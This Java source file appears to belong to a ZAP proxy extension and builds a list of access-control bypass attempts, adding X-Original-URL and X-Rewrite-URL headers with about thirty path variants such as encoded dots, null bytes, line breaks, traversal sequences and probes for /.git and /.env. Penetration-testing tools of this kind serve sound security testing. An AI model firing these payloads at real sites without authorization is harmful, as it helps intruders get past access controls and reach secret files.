package org.zaproxy.zap.extension.hacktor.technique;

import org.parosproxy.paros.network.HttpMessage;
import org.zaproxy.zap.extension.hacktor.Technique;
import java.util.List;
import java.util.function.BiConsumer;

public class XOriginalURLTechniqueBuilder extends AbstractTechniqueBuilder {
    @Override public String getFamily() { return "X-Original URL"; }
    @Override public int getOrder() { return 46; }

    @Override
    public void build(List<Technique> techs, BiConsumer<HttpMessage, String> setPath,
                      TechniqueBuilder.PathContext ctx) {
        String[] xowForms = {
            ctx.baseClean, ctx.baseClean + "/", ctx.baseClean + "/.", ctx.baseClean + "//",
            ctx.baseClean + ";", ctx.baseClean + "/%2e", ctx.baseClean + "..", ctx.baseClean + "%2f",
            ctx.baseClean + "/index.php", ctx.baseClean + "/../", ctx.baseClean + "/.",
            "/" + ctx.lastSeg, "./" + ctx.lastSeg, ctx.baseClean + "%00",
            ctx.baseClean + "%0d", ctx.baseClean + "%0a", ctx.baseClean + "%09",
            ctx.baseClean + "~", ctx.baseClean + "%23", ctx.baseClean + "%3f",
            ctx.baseClean + "%26", ctx.baseClean + ".json", ctx.baseClean + ".xml",
            ctx.baseClean + "%00.json", ctx.baseClean + "%2e" + ctx.baseClean,
            "./" + ctx.baseClean, "../" + ctx.baseClean, "/" + ctx.baseClean,
            ctx.baseClean + "/*", ctx.baseClean + "/.git", ctx.baseClean + "/.env",
            ctx.baseClean + "/..%00", ctx.baseClean + "/..%0d", ctx.baseClean + "/..%0a"
        };
        for (String xf : xowForms) {
            final String p = xf;
            techs.add(new Technique("X-Original URL", "XURL:" + xf,
                "X-Original-URL + X-Rewrite-URL: " + xf,
                base -> {
                    HttpMessage c = cloneMsg(base);
                    addHeader(c, "X-Original-URL", p);
                    addHeader(c, "X-Rewrite-URL", p);
                    return c; }));
        }
    }
}
